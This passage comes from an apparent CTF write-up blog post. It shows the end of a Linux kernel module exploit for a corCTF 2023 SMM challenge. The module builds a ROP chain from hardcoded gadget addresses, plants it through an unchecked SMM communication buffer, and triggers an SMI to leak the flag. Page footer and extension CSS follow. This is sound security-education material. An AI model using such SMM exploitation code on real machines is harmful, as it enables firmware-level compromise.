<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">dump_notes</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">dest</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">comm_data_t</span> <span class="n">payload</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">.</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">DUMP_NOTES</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">dest</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span><span class="p">;</span>

    <span class="n">u64</span> <span class="n">combuf_off</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">buffersz_off</span> <span class="o">=</span> <span class="n">combuf_off</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">ret_off</span> <span class="o">=</span> <span class="n">buffersz_off</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>

    <span class="n">write_phys_mem</span><span class="p">(</span><span class="n">smcc</span> <span class="o">+</span> <span class="n">combuf_off</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload_loc</span><span class="p">);</span>
    <span class="n">write_phys_mem</span><span class="p">(</span><span class="n">smcc</span> <span class="o">+</span> <span class="n">buffersz_off</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>

    <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">io_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">target_guid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">efi_guid_t</span><span class="p">));</span>
    <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">io_addr</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">efi_guid_t</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">));</span>
    <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">io_addr</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">efi_guid_t</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">comm_data_t</span><span class="p">));</span>

    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Triggering dump SMI </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">outb</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">get_note</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">comm_data_t</span> <span class="n">payload</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">.</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">GET_NOTE</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span><span class="p">;</span>

    <span class="n">u64</span> <span class="n">combuf_off</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">buffersz_off</span> <span class="o">=</span> <span class="n">combuf_off</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">ret_off</span> <span class="o">=</span> <span class="n">buffersz_off</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>

    <span class="n">write_phys_mem</span><span class="p">(</span><span class="n">smcc</span> <span class="o">+</span> <span class="n">combuf_off</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload_loc</span><span class="p">);</span>
    <span class="n">write_phys_mem</span><span class="p">(</span><span class="n">smcc</span> <span class="o">+</span> <span class="n">buffersz_off</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>

    <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">io_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">target_guid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">efi_guid_t</span><span class="p">));</span>
    <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">io_addr</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">efi_guid_t</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">));</span>
    <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">io_addr</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">efi_guid_t</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">comm_data_t</span><span class="p">));</span>

    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Triggering IN SMI </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">outb</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">);</span>

    <span class="n">comm_data_t</span> <span class="n">out</span><span class="p">;</span>

    <span class="n">memcpy_fromio</span><span class="p">(</span><span class="o">&amp;</span><span class="n">out</span><span class="p">,</span> <span class="n">io_addr</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">efi_guid_t</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">comm_data_t</span><span class="p">));</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">out</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">note</span><span class="p">.</span><span class="n">note</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">note</span><span class="p">.</span><span class="n">note</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">dump_buf</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">sz</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">p_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sz</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">p_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">do_exp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"do_exp called </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">smcc</span> <span class="o">=</span> <span class="n">find_smm_core_private_data</span><span class="p">();</span>

    <span class="n">payload_loc</span> <span class="o">=</span> <span class="n">find_data_reg</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">payload_loc</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"to find payload loc</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Map the physical address to a virtual address</span>
    <span class="n">io_addr</span> <span class="o">=</span> <span class="n">ioremap</span><span class="p">(</span><span class="n">payload_loc</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">io_addr</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">pr_err</span><span class="p">(</span><span class="s">"unable to map payload loc %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">payload_loc</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">smcc</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"unable to find smcc</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"smmc addr: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">smcc</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">module_base</span> <span class="o">=</span> <span class="mh">0x0007FF9C000</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x7ff9ebbc</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">copy_mem_addr</span> <span class="o">=</span> <span class="mh">0x7ff9dd26</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">nop</span> <span class="o">=</span> <span class="n">module_base</span> <span class="o">+</span> <span class="mh">0x1e6e</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">pop_r12_r13_ret</span> <span class="o">=</span> <span class="n">module_base</span> <span class="o">+</span> <span class="mh">0x1d43</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">pop_rbx_ret</span> <span class="o">=</span> <span class="n">module_base</span> <span class="o">+</span> <span class="mh">0x10e1</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">pop_rsp_r13_ret</span> <span class="o">=</span> <span class="n">module_base</span> <span class="o">+</span> <span class="mh">0x1d44</span><span class="p">;</span>

    <span class="kt">uint64_t</span> <span class="n">chain</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">pop_r12_r13_ret</span><span class="p">,</span>
        <span class="n">payload_loc</span><span class="p">,</span>
        <span class="n">flag_addr</span><span class="p">,</span>
        <span class="n">pop_rbx_ret</span><span class="p">,</span>
        <span class="mh">0x40</span><span class="p">,</span>
        <span class="n">copy_mem_addr</span><span class="p">,</span>
        <span class="mh">0x41</span><span class="p">,</span>
        <span class="mh">0x41</span><span class="p">,</span>
        <span class="mh">0x41</span><span class="p">,</span>
        <span class="mh">0x41</span><span class="p">,</span>
        <span class="n">pop_rsp_r13_ret</span><span class="p">,</span>
        <span class="mh">0x7ffb6c90</span><span class="p">,</span> <span class="c1">// rsp of an intact stackframe</span>
    <span class="p">};</span>

    <span class="kt">char</span> <span class="n">note</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">p_note</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">note</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">p_note</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">nop</span><span class="p">;</span>
        <span class="n">p_note</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">nop</span><span class="p">;</span>

        <span class="n">add_note</span><span class="p">(</span><span class="n">idx</span><span class="o">++</span><span class="p">,</span> <span class="n">note</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span> <span class="n">i</span><span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">p_note</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">chain</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">p_note</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">chain</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>

        <span class="n">add_note</span><span class="p">(</span><span class="n">idx</span><span class="o">++</span><span class="p">,</span> <span class="n">note</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">uint64_t</span> <span class="n">rsp</span> <span class="o">=</span> <span class="mh">0x7ffb6ab0</span><span class="p">;</span>
    <span class="n">dump_notes</span><span class="p">(</span><span class="n">rsp</span><span class="p">);</span>

    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x40</span><span class="p">];</span>
    <span class="n">memcpy_fromio</span><span class="p">(</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">,</span> <span class="n">io_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">));</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Flag: %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">hello_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
 <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Exploit module loaded</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 <span class="k">return</span> <span class="n">do_exp</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">hello_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
 <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Exploit module unloaded</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">hello_init</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">hello_exit</span><span class="p">);</span>

<span class="c1">// corctf{uNch3CKeD_c0Mm_BufF3r:(}</span>
</code></pre></div></div>

  </div><a class="u-url" href="https://blog.libh0ps.so/2023/08/02/corCTF2023.html" hidden=""></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">H0ps CTF adventures</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">H0ps CTF adventures</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/Ollrogge"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">Ollrogge</span></a></li><li><a href="https://www.twitter.com/_h0p5"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">_h0p5</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p></p>
      </div>
    </div>

  </div>

</footer>



<div id="rememberry__extension__root" style="all: unset;"><template shadowrootmode="open"><main data-reactroot=""><!-- react-empty: 2 --><!-- react-empty: 3 --></main><style type="text/css">.Translator__wrapper__2qJID {
  position: absolute;
  left: 0;
  z-index: 1010;
  width: 100vw;
  opacity: 1;
  transition: opacity 200ms cubic-bezier(0.18, 0.65, 0.26, 0.98), transform 200ms ease-out; }
  .Translator__wrapper__2qJID[data-popup-direction="downward"] {
    top: 0;
    transform: translateY(9px); }
    .Translator__wrapper__2qJID[data-popup-direction="downward"] > .Translator__translation-popup__2_mD4 > .Translator__arrow__3eIZZ {
      top: -8px;
      transform: translateX(-50%) rotate(45deg);
      background-color: #2EC4B6; }
    .Translator__wrapper__2qJID[data-popup-direction="downward"] > .Translator__translation-popup__2_mD4:after {
      top: 0; }
  .Translator__wrapper__2qJID[data-popup-direction="upward"] {
    bottom: 0;
    transform: translateY(-8px); }
    .Translator__wrapper__2qJID[data-popup-direction="upward"] > .Translator__translation-popup__2_mD4 > .Translator__arrow__3eIZZ {
      bottom: -8px;
      transform: translateX(-50%) rotate(-135deg);
      background-color: #FDFFFC; }
    .Translator__wrapper__2qJID[data-popup-direction="upward"] > .Translator__translation-popup__2_mD4:after {
      bottom: 0; }
  .Translator__wrapper__2qJID:not([data-popup-direction="none"]) > .Translator__translation-popup__2_mD4:after {
    position: absolute;
    transform: translateX(-50%);
    width: 32px;
    height: 16px;
    background-color: #FDFFFC;
    content: ''; }
  .Translator__wrapper__2qJID:not([data-popup-direction="none"]) > .Translator__translation-popup__2_mD4 > .Translator__arrow__3eIZZ {
    position: absolute;
    width: 16px;
    height: 16px;
    border-top: 1px solid #2EC4B6;
    border-left: 1px solid #2EC4B6;
    box-shadow: 0 0 8px rgba(1, 22, 39, 0.3); }
  .Translator__wrapper__2qJID.Translator__in__3rwf1 {
    transform: translateY(0); }
  .Translator__wrapper__2qJID.Translator__in__3rwf1, .Translator__wrapper__2qJID.Translator__out__3AHaS {
    opacity: 0; }
  .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 {
    position: absolute;
    display: flex;
    min-width: 180px;
    max-width: 360px;
    border: 1px solid #2EC4B6;
    border-radius: 4px;
    box-shadow: 0 0 8px rgba(1, 22, 39, 0.3);
    flex-direction: column;
    color: #011627;
    background-color: #FDFFFC; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-10%"] {
      transform: translateX(-10%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-10%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-10%"]:after {
        left: 10%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-20%"] {
      transform: translateX(-20%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-20%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-20%"]:after {
        left: 20%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-30%"] {
      transform: translateX(-30%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-30%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-30%"]:after {
        left: 30%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-40%"] {
      transform: translateX(-40%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-40%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-40%"]:after {
        left: 40%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-50%"] {
      transform: translateX(-50%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-50%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-50%"]:after {
        left: 50%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-60%"] {
      transform: translateX(-60%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-60%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-60%"]:after {
        left: 60%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-70%"] {
      transform: translateX(-70%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-70%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-70%"]:after {
        left: 70%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-80%"] {
      transform: translateX(-80%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-80%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-80%"]:after {
        left: 80%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-90%"] {
      transform: translateX(-90%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-90%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-90%"]:after {
        left: 90%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl {
      z-index: 1;
      display: flex;
      height: 30px;
      background-color: #2EC4B6; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5 {
        display: inline-block;
        width: 30px;
        height: 30px;
        outline: none;
        flex-shrink: 0;
        color: #FDFFFC;
        font-size: 18px;
        line-height: 30px;
        text-align: center;
        text-shadow: 0 1px #20897f; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5:focus {
          color: #cc7f16; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5:active:not(.Translator__disabled__Cwgfb) {
          text-shadow: 0 -1px #20897f; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5.Translator__disabled__Cwgfb {
          color: #b8ebe6; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV {
        vertical-align: top;
        display: inline-flex;
        margin: 5px 5px;
        flex-grow: 1;
        justify-content: center; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > i {
          margin-left: 2px;
          color: #FDFFFC; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw {
          position: relative;
          display: inline-flex; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select:hover {
            border: none;
            box-shadow: rgba(1, 22, 39, 0.078) 0 1px 0, rgba(253, 255, 252, 0.74) 0 1px 2px inset;
            border-radius: 5px;
            color: #011627;
            text-shadow: none;
            background-image: none;
            background-color: rgba(253, 255, 252, 0.9);
            cursor: pointer;
            -webkit-appearance: menulist;
            font-size: 12px;
            background-color: #FDFFFC; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select.Translator__true-select__1H8eq {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            opacity: 0; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select.Translator__fake-select__TiLW- {
            vertical-align: top;
            min-width: 40px;
            pointer-events: none; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo {
      position: relative;
      min-height: 30px;
      padding: 16px 5px; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translated-from__EL6tK {
        position: absolute;
        top: 4px;
        right: 8px;
        color: #2EC4B6;
        font-size: 12px;
        cursor: help; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw {
        max-height: 116px;
        margin-bottom: 7px;
        padding: 0 8px;
        font-style: italic;
        word-break: break-word;
        overflow: auto; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw > .Translator__pronunciation-btn__1kbhJ {
          display: inline-block;
          width: 22px;
          margin-right: 8px; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw > .Translator__transcription-loader__3c8Vr {
          margin-top: 5px;
          text-align: center;
          cursor: help; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw > .Translator__transcription__T_fKH {
          margin-top: 5px;
          margin-left: 30px;
          font-style: italic; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j {
        max-height: 250px;
        padding: 0 8px;
        overflow: auto; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U:not(:first-child) {
          margin-top: 10px; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr {
          display: flex;
          border-bottom: 1px dotted #b8ebe6;
          justify-content: flex-end;
          color: #73d7ce;
          font-size: .9em;
          font-style: italic; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg {
            flex-grow: 1;
            text-align: left; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg > i.Translator__upside-down__2XYYt:before {
              transform: rotate(180deg);
              display: inline-block; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg > i:before {
              margin: 0; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:hover, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:focus {
              color: #2EC4B6; }
              .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:hover > i, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:focus > i {
                transform: scale(1.2);
                display: inline-block; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ {
          display: flex;
          min-height: 28px;
